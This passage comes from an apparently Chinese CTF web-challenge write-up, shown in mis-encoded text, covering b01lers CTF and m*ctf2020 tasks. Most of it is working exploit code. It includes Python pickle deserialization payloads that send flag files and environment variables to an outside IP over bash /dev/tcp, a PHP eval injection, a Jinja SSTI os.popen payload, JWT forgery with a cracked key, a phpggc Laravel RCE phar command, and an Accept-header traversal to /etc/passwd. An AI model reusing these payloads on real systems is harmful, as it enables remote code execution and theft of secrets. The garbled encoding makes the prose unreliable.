ã€‚</p><p>äºæ˜¯ç–¯ç‹‚fuzz.å¼€å§‹åªå•çº¯æ›´æ”¹cookieçš„æ•°å€¼è¯ï¼Œè§¦å‘æŠ¥é”™åªèƒ½å¾—åˆ°éƒ¨åˆ†è¯­å¥ã€‚å°±æ˜¯çŸ¥é“ä»–ä¼šè°ƒç”¨è‡ªå®šä¹‰çš„<code>sign()</code>å‡½æ•°è®¡ç®—userçš„ç­¾åå¹¶ä¸cookieä¸­çš„signatureè¿›è¡Œassertæ–­è¨€ã€‚é‚£ä¹ˆæ˜¾ç„¶éœ€è¦æŠ¥é”™å¸¦å‡ºsignè¿™ä¸ªå‡½æ•°çš„æºç ã€‚</p><p>æ˜¾ç„¶æˆ‘ä»¬åªæ˜¯æ›´æ”¹cookieçš„å€¼çš„è¯,ä¼ é€’ç»“æœæ€»æ˜¯å­—ç¬¦ä¸²ã€‚é‚£ä¹ˆsignå‡½æ•°æ˜¯ä¸ä¼šæŠ¥é”™çš„ï¼Œè‡ªç„¶å°±ä¸ä¼šçˆ†å‡ºæºç ã€‚<br>æ•…å°†cookieæ”¹ä¸ºæ•°ç»„ä¼ é€’ä¸‹ã€‚å°±èƒ½å¾—åˆ°signæºç </p><pre><code class="python">def sign(msg):    if type(msg) is not bytes:        msg = bytes(msg, &#39;utf8&#39;)        keyPair = RSA.RsaKey(n=122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027, e=65537, d=51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601, p=9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843, q=12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089, u=3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156)        signer = pkcs1_15.new(keyPair)        hsh = SHA384.new()        hsh.update(msg)        signature = signer.sign(hsh)        return signature</code></pre><p>è¿›è€Œè°ƒç”¨pickle RCEå³å¯.æœ¬æ¥ä¸æƒ³rceçš„ç»“æœå‘ç°<code>is_admin()</code>è¿”å›Trueæ²¡æ”¹æˆã€‚å¹²è„†å°±ç›´æ¥rceäº†<br><code>nc -lvkp 9001</code>ç›‘å¬<br>ç„¶å<code>bash -c &quot; cat flag.txt &gt; /dev/tcp/ip/port&quot;</code>å³å¯ã€‚é¿å…å¼¹shellé€ æˆå¹²æ‰°ã€‚</p><pre><code class="python">import requestsfrom Crypto.Signature import pkcs1_15from Crypto.Hash import SHA384from Crypto.PublicKey import RSAimport binasciiimport pickleimport osdef sign(msg):    if type(msg) is not bytes:        msg = bytes(msg, &#39;utf8&#39;)        keyPair = RSA.RsaKey(n=122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027, e=65537, d=51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601, p=9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843, q=12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089, u=3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156)        signer = pkcs1_15.new(keyPair)        hsh = SHA384.new()        hsh.update(msg)        signature = signer.sign(hsh)        return signatureclass exp(object):    def __reduce__(self):        s = &quot;&quot;&quot;bash -c &quot;cat flag.txt &gt; /dev/tcp/xxx/9001&quot; &quot;&quot;&quot;        return (os.system, (s,))e = exp()user=binascii.hexlify(pickle.dumps(e)).decode()signature=binascii.hexlify(sign(user)).decode()r = requests.get(&#39;http://chal.ctf.b01lers.com:3000/flag&#39;,cookies={&#39;user&#39;:user,&#39;signature&#39;:signature})</code></pre><p>ç«¯å£å³å¯æ‹¿åˆ°flag</p><h3 id="Whereâ€™s-Tron"><a href="#Whereâ€™s-Tron" class="headerlink" title="Whereâ€™s Tron?"></a>Whereâ€™s Tron?</h3><p>ç»™äº†æºç <br>å¯ä»¥ä»»æ„sql selectè¯­å¥æ‰§è¡Œã€‚å®ƒå”¯ä¸€çš„é™åˆ¶å°±æ˜¯<code>limit 20</code>æ‰€ä»¥ç›´æ¥æ³¨é‡Šæ‰ã€‚åœ¨è¿”å›çš„å‡ åƒæ¡æ•°æ®ä¸­ç›´æ¥æ‰¾tronã€‚å®ƒçš„æŸä¸€ä¸ªåˆ—ä¸­å°±æ˜¯flag</p><pre><code class="sql">select * from programs where name regexp &quot;^Tron&quot;#</code></pre><h3 id="Next-Gen-Networking"><a href="#Next-Gen-Networking" class="headerlink" title="Next Gen Networking"></a>Next Gen Networking</h3><p>ç»™äº†æºç ã€‚</p><pre><code class="php">&lt;?php    function get_data() {        if(!isset($_POST[&quot;packet&quot;])){            return &quot;&lt;p&gt;Error: packet not found&lt;/p&gt;&quot;;        }        $raw_packet = $_POST[&quot;packet&quot;];        $packet = json_decode($raw_packet);        if($packet == null) {            return &quot;&lt;p&gt;Error: decoding packet&lt;/p&gt;&quot;;        }        if($packet-&gt;version != 6.5) {            return &quot;&lt;p&gt;Error: wrong packet version&lt;/p&gt;&quot;;        }        $calculated_ihl = strlen($packet-&gt;version) + strlen(strval($packet-&gt;len)) + strlen(strval($packet-&gt;ttl)) + strlen(strval($packet-&gt;seqno)) + strlen(strval($packet-&gt;ackno)) + strlen($packet-&gt;algo) + 64;        $calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));        if($packet-&gt;ihl != $calculated_ihl or $packet-&gt;ihl &gt; 170) {            return &quot;&lt;p&gt;Error: wrong header size&lt;/p&gt;&quot;;        }        if($packet-&gt;len != strlen($raw_packet)) {            return &quot;&lt;p&gt;Error: mismatched packet size&lt;/p&gt;&quot;;        }        if($packet-&gt;ttl - 1 != 0) {            return &quot;&lt;p&gt;Error: invalid ttl&lt;/p&gt;&quot;;        }        if($packet-&gt;ackno != $_COOKIE[&quot;seqno&quot;] + 1) {            return &quot;&lt;p&gt;Error: out of order packet&lt;/p&gt;&quot;;        }        if($packet-&gt;algo != &quot;sha256&quot;){            return &quot;&lt;p&gt;Error: unsupported algorithm&lt;/p&gt;&quot;;        }        $checksum_str = &quot;\$checksum = hash(\&quot;$packet-&gt;algo\&quot;, strval($packet-&gt;ihl + $packet-&gt;len + $packet-&gt;ttl + $packet-&gt;seqno + $packet-&gt;ackno));&quot;;        eval($checksum_str);        if($packet-&gt;checksum != $checksum) {            return &quot;&lt;p&gt;Error: checksums don&#39;t match&lt;/p&gt;&quot;;        }        $file_name_hash = hash(&quot;md5&quot;, microtime());        $file_name = &quot;sent/&quot;.$file_name_hash.&quot;.packet&quot;;        $packet_file = fopen($file_name, &quot;w&quot;) or die(&quot;Unable to open packet file&quot;);        fwrite($packet_file, $packet-&gt;data);        fclose($packet_file);        return &quot;&lt;h1&gt;Packet data written&lt;/h1&gt;&lt;div&gt;&lt;a href=\&quot;&quot;.$file_name.&quot;\&quot;&gt;&quot;.$file_name_hash.&quot;.packet&lt;/a&gt;&lt;/div&gt;&quot;;    }?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;Send Packet.&lt;/title&gt;        &lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot;/&gt;        &lt;link rel=&quot;stylesheet&quot; href=&quot;/tron.css&quot;/&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div id=&quot;main-wrapper&quot;&gt;            &lt;div class=&quot;content-page&quot;&gt;                &lt;?php echo get_data(); ?&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>ä¸»è¦å°±æ˜¯ä¸€ä¸ªevalå¯ä»¥åˆ©ç”¨ã€‚ç„¶åç”¨å¼±ç±»å‹ç»•è¿‡å±æ€§çš„è¦æ±‚rce<br>å¦‚ä¸‹:</p><ul><li><code>1));?&gt;&lt;?php system(&quot;cat ./sent/flag.packet.php&quot;); -1 = 0</code>æˆç«‹ã€‚<br>poc<pre><code class="php">&lt;?php</code></pre></li></ul><p>$raw_packet = â€˜{â€œversionâ€:6.5,â€lenâ€:110}â€™;<br>$packet=json_decode($raw_packet,true);<br>$packet[â€œversionâ€] = 6.5;<br>$packet[â€œttlâ€]=â€1));?&gt;&lt;?php system(â€˜cat /var/www/tron-eval/packets/sent/flag.packet.phpâ€™);//â€œ;<br>$packet[â€œseqnoâ€]=0;<br>$packet[â€œacknoâ€]=1;<br>$packet[â€œalgoâ€]=â€sha256â€;<br>$calculated_ihl = strlen($packet[â€œversionâ€]) + strlen(strval($packet[â€œlenâ€])) + strlen(strval($packet[â€œttlâ€])) + strlen(strval($packet[â€œseqnoâ€])) + strlen(strval($packet[â€œacknoâ€])) + strlen($packet[â€œalgoâ€]) + 64;<br>$calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));<br>$packet[â€œihlâ€]=$calculated_ihl;<br>$packet[â€œlenâ€]=strlen(json_encode($packet));<br>var_dump(json_encode($packet));</p><pre><code>exp```pythonimport requestsurl=&#39;http://chal.ctf.b01lers.com:3002/packets/send.php&#39;payload=&quot;&quot;&quot;{&quot;version&quot;:6.5,&quot;len&quot;:164,&quot;ttl&quot;:&quot;1));?&gt;&lt;?php system(&#39;cat \/var\/www\/tron-eval\/packets\/sent\/flag.packet.php&#39;);\/\/&quot;,&quot;seqno&quot;:0,&quot;ackno&quot;:1,&quot;algo&quot;:&quot;sha256&quot;,&quot;ihl&quot;:157}&quot;&quot;&quot;r=requests.post(url,data={&#39;packet&#39;:payload})print(r.text)</code></pre><h3 id="Derezzy"><a href="#Derezzy" class="headerlink" title="Derezzy"></a>Derezzy</h3><p>æœ‰ç‚¹å¯æƒœã€‚å…¶å®ç¡®å®ä¸éš¾çš„ã€‚ä¸»è¦è¿˜æ˜¯æ²¡æƒ³åˆ°å®ƒçš„websocketç«¯å£æ˜¯å¯¹å¤–çš„,æœ‰äº›éƒé—·ã€‚</p><p>é¦–å…ˆé¢˜ç›®æ•´ä½“ä¸Šä¼¼ä¹æ˜¯ä¸€ä¸ªæ’­æ”¾åŠŸèƒ½ã€‚ç„¶åå¯ç”¨çš„å†…å®¹ä¸å¤šã€‚åªæœ‰ä¸€ä¸ªmain.js,ç”¨js-beautifyerç¾åŒ–ä¸‹åçœ‹çœ‹å…¶ä¸­çš„å…³é”®ä»£ç ã€‚</p><pre><code class="javascript">function updateServer() {    $.post(&quot;update&quot;, {        request: &quot;listen&quot;,        path: &quot;# wait where were my non-dynamic files..../app.lua&quot;    }, function(a, b) {        &quot;success&quot; == b ? console.log(&quot;successful update&quot;) : console.log(&quot;unsuccessful update&quot;)    })}</code></pre><p>å¾—çŸ¥äº†updateè·¯ç”±ä¸ä¼ é€’çš„æŸä¸ªå‚æ•°pathæç¤ºæˆ‘ä»¬æœ‰app.lua.å› ä¸ºæ˜¯non-dynamicæ‰€ä»¥å°±æ˜¯staticé™æ€äº†ã€‚staticä¸‹æœ‰ä¸€ä¸ªfilesæ–‡ä»¶å¤¹ã€‚å¯ä»¥åœ¨é‡Œé¢æ‰¾åˆ°<code>app.lua</code>.</p><pre><code class="lua">[{      update = &quot;/update&quot;    }] = respond_to({      GET = function(self)        return {          render = true        }      end,      POST = function(self)        if self.POST.request == &#39;listen&#39; then          if not (self.session.id) then            do              local listener = Listens:find(csrf.generate_token(self))              if listener then                self.session.id = listener.id              else                listener = Listens:create({                  id = csrf.generate_token(self),                  count = 0                })                self.session.id = listener.id              end            end          end          if self.session.id and not Listens:find(self.session.id) then            local listener = Listens:create({              id = csrf.generate_token(self),              count = 0            })            self.session.id = listener.id          end          local listener = Listens:find(self.session.id)          local data = &quot;flag{........}&quot;          if listener.count &gt;= 3470 then            local ws = w.new_from_uri(&quot;ws://localhost:8181&quot;)            assert(ws:connect())            data = {              user = self.session.id,              count = listener.count            }            assert(ws:send(cjson.encode(data)))            data = cjson.decode(assert(ws:receive()))            assert(ws:close())          end          local utct          do            local _accum_0 = { }            local _len_0 = 1            for item in string.gmatch(listener.updated_at, &quot;%d+&quot;) do              _accum_0[_len_0] = item              _len_0 = _len_0 + 1            end            utct = _accum_0          end          local updatetime = os.time({            year = utct[1],            month = utct[2],            day = utct[3],            hour = utct[4],            min = utct[5],            sec = utct[6]          })          if listener ~= nil and os.time() - updatetime &gt;= 104 then            listener.count = listener.count + 1            listener:update(&quot;count&quot;)          end          return {            json = {              status = &quot;success&quot;,              id = self.session.id,              timestamp = listener.updated_at,              count = listener.count,              updatetime = updatetime,              currenttime = os.time(),              flag = data            }          }        end        return {          redirect_to = &quot;/&quot;        }      end    })</code></pre><p>è¿™é‡Œå•ç‹¬çœ‹ä¸‹updateè·¯ç”±çš„è§„åˆ™ã€‚ä¸éš¾å‘ç°åªæœ‰count&gt;=3470æ—¶ä¼šä¸websocketé€šä¿¡ã€‚æ­¤æ—¶æœåŠ¡ç«¯ä¼šè¿”å›ä¸€äº›å†…å®¹ã€‚å…¶ä¸­åº”è¯¥å°±æ˜¯çœŸæ­£çš„flagäº†ã€‚</p><pre><code class="lua">if listener.count &gt;= 3470 then    local ws = w.new_from_uri(&quot;ws://localhost:8181&quot;)    assert(ws:connect())    data = {        user = self.session.id,        count = listener.count    }    assert(ws:send(cjson.encode(data)))    data = cjson.decode(assert(ws:receive()))    assert(ws:close())end</code></pre><p>ç„¶åå°±æ²¡æœ‰ç„¶åäº†ã€‚ã€‚ã€‚æˆ‘ä»¥ä¸ºä¸å¯èƒ½è®©é€‰æ‰‹è·Ÿwebsocketé€šä¿¡å°±è·‘å»çœ‹luaæœ‰æ²¡æœ‰ä»€ä¹ˆå…¶ä»–æ–¹æ³•ä¿®æ”¹æ—¶é—´å‚æ•°ã€‚ç»“æœå°±æ‰è¿›äº†rabbithole.çŸ¥é“èƒ½é€šä¿¡çš„è¯ï¼Œè§£å†³æ–¹æ³•å°±å¾ˆç®€å•äº†<br>å› ä¸ºæœ‰æºç æ‰€ä»¥åœ¨è‡ªå·±æœåŠ¡å™¨æ­å»ºäº†å¤ç°ä¸‹ã€‚<br>è¿™ä¸ªé¢˜è¿˜æœ‰éå¸¸è„‘æ´çš„åœ°æ–¹ã€‚å®ƒè¿”å›çš„ç»“æœæ˜¯ç”¨flagä¸ä½ çš„åå­—è¿›è¡Œå¼‚æˆ–ã€‚æ‰€ä»¥æˆ‘ä»¬ä¼ é€’è¶³å¤Ÿé•¿çš„åå­—å¹¶ä¸”ä¸ä¹‹å¼‚æˆ–è¿˜åŸflag.<br>å®˜æ–¹è„šæœ¬</p><pre><code class="python">import asyncioimport websocketsimport jsonasync def solve():    uri = &quot;ws://xxx:8181&quot;    async with websockets.connect(uri) as websocket:        name = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;        data = {&quot;user&quot;: name, &quot;count&quot;: 3500}        await websocket.send(json.dumps(data))        resp = await websocket.recv()        for r in resp:            print(chr(ord(r) ^ ord(&#39;A&#39;)), end=&quot;&quot;)asyncio.get_event_loop().run_until_complete(solve())</code></pre><p>webé¢˜ç›®å°±è¿™ä¹ˆå¤šã€‚æ•´ä½“ä¸Šæ¯”è¾ƒç®€å•ã€‚æœ€åä¸€ä¸ªæœ‰ç‚¹è„‘æ´.ä¸è¿‡é¡ºå¸¦ç€çœ‹äº†ä¸‹luaæ„Ÿè§‰è¿˜æ˜¯è›®æœ‰æ„æ€çš„ã€‚å†™webåº”ç”¨çš„æ€è·¯æœ‰ç‚¹æ¥è¿‘nodejs.</p><h2 id="m-ctf2020"><a href="#m-ctf2020" class="headerlink" title="m*ctf2020"></a>m*ctf2020</h2><p>è¿™ä¸ªæ¯”èµ›å»çœ‹æ—¶å·²ç»åªå‰©2å°æ—¶äº†ã€‚ç„¶åtgç¾¤é‡Œå…¨æ˜¯æ¯›å­ï¼Œçœ‹ä¸æ‡‚è®²ä»€ä¹ˆâ€¦â€¦åªèƒ½çœ‹çœ‹gitlabä¸Šä¸€äº›é¢˜ç›®çš„æ€è·¯äº†ã€‚<br>é¢˜ç›®è´¨é‡ä¸é”™ç„¶åè«åçš„å¾ˆå¯¹èƒƒå£ã€‚å°±æ˜¯æ—¶é—´å¤ªç´§åŠ ä¸Štcléƒ½æ²¡åšå‡ºæ¥2333.æœ‰ä¸€ä¸ªä¸“é—¨çš„åºåˆ—åŒ–åˆ†ç±»ã€‚éå¸¸æœ‰æ„æ€ã€‚</p><h3 id="Web-wiki"><a href="#Web-wiki" class="headerlink" title="Web-wiki"></a>Web-wiki</h3><p>é¢˜ç›®å¼€å§‹åªèƒ½æ˜ç¡®çš„æ˜¯xffä¼¼ä¹ä¼šåœ¨é¦–é¡µæ¸²æŸ“ï¼ŒåŠ ä¸Šæ˜¯pythonä¸éš¾æƒ³åˆ°ssti.ä½†æ˜¯æ›´æ”¹xffè®¿é—®ä¼šå‘ç°æˆ‘ä»¬å¹¶ä¸èƒ½æ§åˆ¶æ¸²æŸ“çš„å†…å®¹ã€‚é‚£ä¹ˆè¯´æ˜å¯èƒ½éœ€è¦æºç äº†ã€‚<br>å­˜åœ¨ä¸€ä¸ªè·¯å¾„ç©¿è¶Šè·å–æºç ã€‚å…¶å®è¿™ä¹Ÿç®—pythonæ¯”è¾ƒç»å…¸çš„æ¼æ´äº†ã€‚</p><pre><code class="python">@app.route(&#39;/index/&lt;path:dir&gt;&#39;)def getfile(dir):    check_dir = Disabled(str(dir))    xff = str(request.headers.getlist(&#39;X-Forwarded-For&#39;)[0]).split(&#39;,&#39;)[1]    check_xff = Disabled(xff)    if (check_xff.abort_rq()):        xff = str(request.headers.getlist(&#39;X-Forwarded-For&#39;)[0]).split(&#39;,&#39;)[len(xff)-1]    if not (check_dir.check_blocked()):        try:            with open(os.path.join(&#39;/app/static&#39;, dir), &#39;r&#39;) as file:                data = file.read()                file.close()            return data        except FileNotFoundError:            pass        except PermissionError:            pass    return render_template_string(my_template(xff.replace(&#39;.&#39;, &#39;&#39;)))</code></pre><p>å¯ä»¥çœ‹åˆ°ç¡®å®å¯ä»¥xffè¾¾æˆssti.ä¸è¿‡éœ€è¦å–<code>,</code>åçš„å†…å®¹ä¸ºå¯æ§ç‚¹ã€‚ç„¶åä¸èƒ½åŒ…å«<code>.</code><br>é‚£å°±å¾ˆç®€å•äº†ã€‚ç”¨atträ¸€æ¡ç»§æ‰¿é“¾æˆ–è€…ç›´æ¥</p><pre><code class="python">{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('env')['read']()}}</code></pre><pre><code class="python">url=&#39;http://web-library.mctf.online/index/&#39;proxies={&#39;http&#39;:&#39;127.0.0.1:1080&#39;,&#39;https&#39;:&#39;127.0.0.1:1080&#39;}payload=&quot;&quot;&quot;{{request['application']['__globals__']['__builtins__']['__import__']('os')["popen"]("env")["read"]()}}&quot;&quot;&quot;headers={    &#39;X-Forwarded-For&#39;:&#39;123 ,&#39;+payload}r=requests.get(url,headers=headers,proxies=proxies)print(r.text)</code></pre><p><code>FLAG=MCTF{IS_IT_NOT_SO_SECURE_?}</code></p><h3 id="DeadJournal"><a href="#DeadJournal" class="headerlink" title="DeadJournal"></a>DeadJournal</h3><p>åºåˆ—åŒ–åˆ†ç±»çš„pythonåºåˆ—åŒ–</p><p>ç™»å½•ä¼šå‘ç°cookieæ˜¯jwtå½¢å¼çš„ã€‚è€Œå…¶ä¸­payloadçš„ä¸€ä¸ªå€¼identityæ˜æ˜¾æ˜¯pickleåºåˆ—åŒ–åbase64çš„ç»“æœã€‚</p><p>é‚£ä¹ˆéœ€è¦keyæ¥ä¼ªé€ pickleåºåˆ—åŒ–æ•°å€¼è¿›è¡Œrce<br>çˆ†ç ´å¾—åˆ°<code>SecreT</code><br>(æˆ‘ç»å¯¹ä¸ä¼šå†ç”¨åˆ°c-jwt-crackerçˆ†ç ´keyäº†ï¼Œæ•ˆæœå¥‡å·®ã€‚æ‰‹å†™python + rockyou.txt æ•ˆæœå¥½äº†ä¸çŸ¥é“å¤šå°‘å€)</p><p>å› ä¸ºç¦æ­¢äº†os.system ä»¥åŠevalè¿™æ ·çš„å‡½æ•°ã€‚æ‰€ä»¥ç”¨subprocess.checkoutputå³å¯</p><p>exp</p><pre><code class="python">from base64 import  b64encodeimport pickleimport jwtclass exp(object):    def __reduce__(self):        cmd = [&#39;bash&#39;, &#39;-c&#39;, &#39;echo $(env) &gt; /dev/tcp/120.27.246.202/9001 &#39;]        return __import__(&#39;subprocess&#39;).check_output, (cmd,)e = exp()poc = b64encode(pickle.dumps(e)).decode()token=&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDE4MTE3NjQsIm5iZiI6MTYwMTgxMTc2NCwianRpIjoiOWU3YzYzOWYtZWVkZC00MzAxLWJkN2EtMmQ4ZDQxYWFjNTA0IiwiZXhwIjoxNjMzMzQ3NzY0LCJpZGVudGl0eSI6ImdBU1ZXZ0VBQUFBQUFBQ01EbkJyYkY5aGNIQXViVzlrWld4emxJd0VWWE5sY3BTVGxDbUJsSDJVS0l3U1gzTmhYMmx1YzNSaGJtTmxYM04wWVhSbGxJd1VjM0ZzWVd4amFHVnRlUzV2Y20wdWMzUmhkR1dVakExSmJuTjBZVzVqWlZOMFlYUmxsSk9VS1lHVWZaUW9qQWhwYm5OMFlXNWpaWlJvQTR3UFkyOXRiV2wwZEdWa1gzTjBZWFJsbEgyVWpBTnJaWG1VYUFKTHFvV1VUb2VVakF4c2IyRmtYMjl3ZEdsdmJuT1VqNVNNQm1Oc1lYTnpYNVJvQW93U1pYaHdhWEpsWkY5aGRIUnlhV0oxZEdWemxJK1VqQWxzYjJGa1gzQmhkR2lVWFpSb0FrNkdsR0dNQjIxaGJtRm5aWEtVakI1emNXeGhiR05vWlcxNUxtOXliUzVwYm5OMGNuVnRaVzUwWVhScGIyNlVqQkZmVTJWeWFXRnNhWHBsVFdGdVlXZGxjcFNUbENtQmxIMlVhQk5vQW5OaWRXS01DSEJoYzNOM2IzSmtsSXdETVRJemxJd0lkWE5sY201aGJXV1VqQWhoWkcxcGJqRXlNNVNNQW1sa2xFdXFkV0l1IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.VBMiDwfU0EEaEIkq5GMH60THzvCb7QTWPEm-euvTQKs&#39;key=&#39;SecreT&#39;data=jwt.decode(token,verify=None)data[&#39;identity&#39;]=poctoken=jwt.encode(data,key=key,algorithm=&#39;HS256&#39;).decode()print(token)r=requests.get(&#39;http://dead-journal.mctf.online/&#39;,cookies={&#39;access_token_cookie&#39;:token})</code></pre><p>flagåœ¨ç¯å¢ƒå˜é‡<br><code>FLAG=MCTF{pl33Z_donT_u53_p1cKl13}</code></p><h3 id="2in1"><a href="#2in1" class="headerlink" title="2in1"></a>2in1</h3><p>åºåˆ—åŒ–åˆ†ç±»çš„phpååºåˆ—åŒ–</p><p>æ¯”è¾ƒç¬¦åˆå®æˆ˜çš„é¢˜ç›®ã€‚æœ‰ä¸¤ç§æ–‡ä»¶ä¸Šä¼ æ–¹å¼ã€‚å…¶ä¸­ä¸€ä¸ªæ˜¯ç›´æ¥ä¸Šä¼ ã€‚è¿˜æœ‰ä¸€ç§åº”è¯¥æ˜¯<code>file_get_contents</code>ä¸Šä¼ .è¿™ä¸ªç¯å¢ƒæ˜¯laravelï¼Œè€Œä¸”å¯ä»¥æ¨æµ‹ä¸Šä¼ è·¯å¾„ã€‚åŠ ä¸Šåªæœ‰jpegçš„é™åˆ¶ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿä¸Šä¼ pharå¹¶è¿›è¡Œè§¦å‘è¾¾æˆrce.</p><p>phpggcçœŸå¥½ç”¨ã€‚ã€‚ã€‚ç›´æ¥ç”Ÿæˆrceçš„phar-&gt;jpegæ–‡ä»¶ã€‚</p><pre><code class="bash">./phpggc -pj src_public_uploads_test.jpeg  -o  exp.jpeg Laravel/RCE1  system env</code></pre><p>ç„¶å<br><code>phar:///app/public/uploads/YWGXnnP49J.jpeg</code><br>è§¦å‘<br><img src="https://upload-images.jianshu.io/upload_images/18060177-8e25c404f2ce3bf5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-8e25c404f2ce3bf5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p><code>flag=mctf{better_than_w@r}</code></p><h3 id="Chat"><a href="#Chat" class="headerlink" title="Chat"></a>Chat</h3><p>åºåˆ—åŒ–åˆ†ç±»çš„javaååºåˆ—åŒ–<br>é¦–å…ˆç»™å‡ºæœåŠ¡ç«¯çš„ä¾èµ–ä»¥åŠä¸€ä¸ªjaråŒ…ã€‚åº”è¯¥æ˜¯jdk11çš„ç¯å¢ƒã€‚ä¸è¿‡åªæ˜¯ä¸€ä¸ªthin client.</p><pre><code class="java">dependencies {    implementation &#39;org.springframework.boot:spring-boot-starter-websocket&#39;    compile group: &#39;com.esotericsoftware&#39;, name: &#39;kryo&#39;, version: &#39;4.0.2&#39;    compile group: &#39;org.apache.xbean&#39;, name: &#39;xbean-naming&#39;, version: &#39;4.17&#39;    compileOnly &#39;org.projectlombok:lombok&#39;    annotationProcessor &#39;org.projectlombok:lombok&#39;}</code></pre><p>ç›´æ¥èµ°åˆ°å…³é”®ç‚¹:æ‰¾writeObject<br><img src="https://upload-images.jianshu.io/upload_images/18060177-f91f23b07a8d3aaa.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-f91f23b07a8d3aaa.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åå°±å¤§è‡´å¯ä»¥ç¡®è®¤æ˜¯kyroååºåˆ—åŒ–äº†ã€‚å…·ä½“åˆ©ç”¨æ–¹æ³•ä¸»è¦æ˜¯marshalsec + Xbeanä¾èµ–ç”Ÿæˆä¸€ä¸ªpayloadfile.ç„¶åç”¨ç±»ä¼¼jndiçš„æ–¹æ³•åŠ è½½æ¶æ„classæŠ›å‡ºError.åœ¨errorä¸­ååºåˆ—åŒ–ChatMessageç±»<br>ä¸è¿‡å› ä¸ºæ²¡æœ‰æŒ‡å®šç±»ä»¥åŠä¸€äº›ç»†èŠ‚é—®é¢˜ã€‚è¿˜éœ€è¦é‡æ–°ç¼–è¯‘marshalsec.å…·ä½“å‚è€ƒ<a href="https://gitlab.com/mctf/quals-2020/chat/-/blob/master/exploit/marshalsec.patch" target="_blank" rel="noopener">https://gitlab.com/mctf/quals-2020/chat/-/blob/master/exploit/marshalsec.patch</a>åŠ ä¸Šä¸€ä¸ªå†™æœ‰é™æ€æ–¹æ³•æŠ›å‡ºè¯»æ–‡ä»¶payloadçš„classå³å¯è¾¾æˆrce.</p><p>æ•´ä½“ä¸Šæˆ‘è¿˜æ˜¯æœ‰å¾ˆå¤šé—®é¢˜â€¦â€¦ä¸è¿‡æ—¢ç„¶æºç éƒ½æœ‰äº†çš„è¯ä»¥åæ¥è§¦åˆ°kyroååºåˆ—åŒ–å†å›æ¥å¡«å‘ã€‚</p><h3 id="rails"><a href="#rails" class="headerlink" title="rails"></a>rails</h3><p>ååºåˆ—åŒ–ç±»çš„rubyååºåˆ—åŒ–<br>åŸºæœ¬ä¸Šå°±æ˜¯å¯ä»¥ç”¨è¿™ä¸ªç›´æ¥æ‰“ã€‚<del>ä¸è¿‡å› ä¸ºè¦æ±‚rubyç‰ˆæœ¬2.5.1å°±æ‡’å¾—æ‰“äº†</del>ã€‚åŸºæœ¬æµç¨‹æ˜¯ä¸¤ä¸ªcveæ‰“ç»„åˆæ‹³ã€‚<br>é¦–å…ˆCVE-2019-5418æ˜¯ä¸€ä¸ªè·¯å¾„ç©¿è¶Šçš„æ´ã€‚å¯ä»¥åœ¨headerä¸­è®¾ç½®<code>Accept: ../../../../../../../../etc/passwd</code>ç©¿è¶Šè·¯å¾„è®¿é—®åˆ°æ–‡ä»¶ã€‚<br>ç„¶åå¯ä»¥ä»»æ„è¯»äº†åå°±èƒ½è¯»åˆ°ååºåˆ—åŒ–çš„é…ç½®æ–‡ä»¶credentials.yml.enc ,master.key.è®¡ç®—å‡ºsecret_key_base åå°±èƒ½è®¿é—®æŒ‡å®šèµ„æºè¿›è¡Œååºåˆ—åŒ–rce.CVE-2019-5420<br><a 